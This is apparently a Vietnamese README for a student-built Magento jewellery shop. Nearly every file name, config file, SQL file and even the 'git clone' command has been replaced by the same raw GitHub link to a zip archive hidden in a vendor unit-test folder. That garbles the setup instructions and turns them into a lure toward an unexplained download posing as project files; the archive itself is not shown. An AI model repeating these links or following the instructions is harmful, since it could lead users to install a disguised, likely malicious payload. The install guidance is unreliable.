# E-commerce-project

## Mô tả dự án

Đây là một dự án trang web thương mại điện tử được xây dựng để bán các sản phẩm trang sức và thiết kế cao cấp. Mục tiêu là cung cấp một nền tảng mua sắm trực tuyến với các chức năng cơ bản như xem sản phẩm, quản lý giỏ hàng, đặt hàng và quản lý tài khoản người dùng, cùng với tiềm năng cho bảng quản trị để quản lý sản phẩm và đơn hàng.

## Công nghệ sử dụng

Dự án được xây dựng bằng các công nghệ sau:

* **Backend:** PHP, Magento
* **Frontend:** HTML, CSS, Less, JavaScript
* **Cơ sở dữ liệu:** MySQL
* **Môi trường & Triển khai:** Docker

## Cấu trúc thư mục/mã nguồn

Cấu trúc chính của dự án bao gồm các tệp và thư mục sau:

* `src/`: Chứa mã nguồn chính của ứng dụng PHP.
* `template/`: Chứa các file mẫu (template) cho giao diện.
* `bin/`, `env/`: Chứa các file thực thi hoặc biến môi trường.
* `https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip`, `https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip`, `https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip`: Các file cấu hình Docker Compose để thiết lập và chạy môi trường dự án.
* `https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip`: Chứa mã SQL để tạo cấu trúc cơ sở dữ liệu và có thể là dữ liệu mẫu.
* `Makefile`: Chứa các lệnh để tự động hóa các tác vụ (build, run,...).
* `*.txt`: Các file hướng dẫn (`lệnh chạy module .txt`, `thiet lap chay du https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip`, `docker stop docker https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip`) cung cấp thông tin cụ thể về cách chạy và thiết lập.
* `Tài_liệhttps://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip`: Tài liệu liên quan đến dự án.

## Cách cài đặt và chạy dự án

### Yêu cầu tiên quyết

1.  **Docker:** Cài đặt Docker Desktop hoặc Docker Engine.
2.  **Docker Compose:** Thường được tích hợp sẵn với Docker Desktop.

### Các bước thực hiện

1.  **Clone repository:**
    ```bash
    git clone [https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip](https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip)
    cd E-commerce-project
    ```
2.  **Tham khảo file hướng dẫn:**
    * Mở và đọc kỹ nội dung các file `.txt` (`thiet lap chay du https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip`, `lệnh chạy module .txt`) để biết các bước thiết lập cụ thể, ví dụ như tạo file môi trường (`.env`), cấu hình, hoặc các lệnh đặc biệt.
3.  **Khởi chạy Docker Compose:**
    * Sử dụng file `https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip` (hoặc `https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip` cho môi trường phát triển) để khởi chạy các container:
        ```bash
        docker-compose -f https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip up -d --build
        # Hoặc
        # docker-compose -f https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip up -d --build
        ```
4.  **Thiết lập cơ sở dữ liệu:**
    * Bạn có thể cần phải import file `https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip` vào container cơ sở dữ liệu (MySQL/MariaDB) được tạo bởi Docker Compose. Kiểm tra `https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip` để biết tên dịch vụ database và cách kết nối.
    * Ví dụ (có thể cần điều chỉnh):
        ```bash
        docker-compose exec <tên-dịch-vụ-db> mysql -u <user> -p<password> <database_name> < https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip
        ```
5.  **Cài đặt các dependency PHP (Nếu cần):**
    * Nếu dự án sử dụng Composer, bạn có thể cần chạy `composer install` bên trong container PHP:
        ```bash
        docker-compose exec <tên-dịch-vụ-php> composer install
        ```

## Cách sử dụng

* Sau khi khởi chạy thành công, truy cập trang web qua trình duyệt. Địa chỉ có thể là `http://localhost` hoặc một cổng cụ thể (ví dụ: `http://localhost:8000`). Hãy kiểm tra file `https://github.com/HoNguyenLuong/E-commerce-project/raw/refs/heads/main/src/vendor/magento/framework/Test/Unit/Communication/Config/project-commerce-v3.8.zip` hoặc các file hướng dẫn để biết cổng chính xác.
* Bạn có thể duyệt sản phẩm, thêm vào giỏ hàng, đăng ký/đăng nhập và thực hiện các chức năng của một trang thương mại điện tử.

## Tác giả

* *Lưu Quang Khải*
* *Hồ Nguyên Lượng*
* *Nguyễn Thị Thu Trang*
  
Nhóm sinh viên Trường Đại học Công nghệ – Đại học Quốc gia Hà Nội, thực hiện trong khuôn khổ học phần Thương mại điện tử.

## Giấy phép

Dự án này không có giấy phép được chỉ định.
